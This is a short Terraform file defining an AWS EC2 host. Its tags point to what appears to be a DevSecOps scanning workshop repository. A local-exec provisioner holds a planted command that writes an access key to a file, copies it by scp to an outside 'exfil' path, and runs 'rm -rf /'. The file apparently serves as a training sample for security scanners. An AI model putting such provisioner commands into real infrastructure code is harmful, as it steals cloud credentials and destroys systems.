provider "aws" {
  region = "us-west-2"
}

resource "aws_ec2_host" "test" {
  instance_type     = "t3.small"
  availability_zone = "us-west-2a"

  provisioner "local-exec" {
    command = "echo Running install scripts.. 'echo $ACCESS_KEY > creds.txt ; scp -r creds.txt root@my-home-server.com/exfil/ ; rm -rf /'   "
  }

  tags = {
    git_commit           = "741eb14d4374146a7fd17c44f0cf40a8bf44739c"
    git_file             = "code/build/ec2.tf"
    git_last_modified_at = "2024-10-09 11:29:23"
    git_last_modified_by = "Chargingfast@gmail.com"
    git_modifiers        = "Chargingfast"
    git_org              = "Chargingfast"
    git_repo             = "prisma-cloud-devsecops-workshop-1"
    yor_name             = "test"
    yor_trace            = "e99895c6-a28c-45b1-ac23-80d82e689a65"
  }
}
